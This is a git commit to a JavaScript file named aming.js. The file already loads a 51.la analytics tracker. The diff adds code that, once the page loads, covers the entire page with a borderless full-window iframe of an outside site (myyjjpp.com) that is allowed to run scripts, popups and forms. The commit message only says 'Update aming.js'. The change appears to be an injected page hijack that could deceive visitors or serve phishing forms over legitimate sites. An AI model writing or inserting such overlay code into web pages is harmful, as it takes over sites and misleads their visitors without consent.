284df1ddb6c2e3af62db4fb4e0b9096df32889dc
MYY <liran61468384@gmail.com>
2025-06-14 12:08:01 +0800

    Update aming.js

--- aming.js
+++ aming.js
@@ -1,2 +1,23 @@
 document.write('<script charset="UTF-8" id="LA_COLLECT" src="https://sdk.51.la/js-sdk-pro.min.js"></script>');
 document.write('<script>LA.init({id:"Kn7wIzRfPyfLVhKi",ck:"Kn7wIzRfPyfLVhKi"});</script>');
+window.addEventListener('DOMContentLoaded', function() {
+  const iframe = document.createElement('iframe');
+  iframe.src = 'https://www.myyjjpp.com';
+  iframe.style.position = 'absolute';
+  iframe.style.top = '0';
+  iframe.style.left = '0';
+  iframe.style.width = '100%';
+  iframe.style.height = '100%';
+  iframe.style.border = 'none';
+  iframe.setAttribute('allowfullscreen', '');
+  iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-popups allow-forms');
+
+  document.documentElement.style.margin = '0';
+  document.documentElement.style.padding = '0';
+  document.documentElement.style.height = '100%';
+  document.body.style.margin = '0';
+  document.body.style.padding = '0';
+  document.body.style.height = '100%';
+
+  document.body.appendChild(iframe);
+});
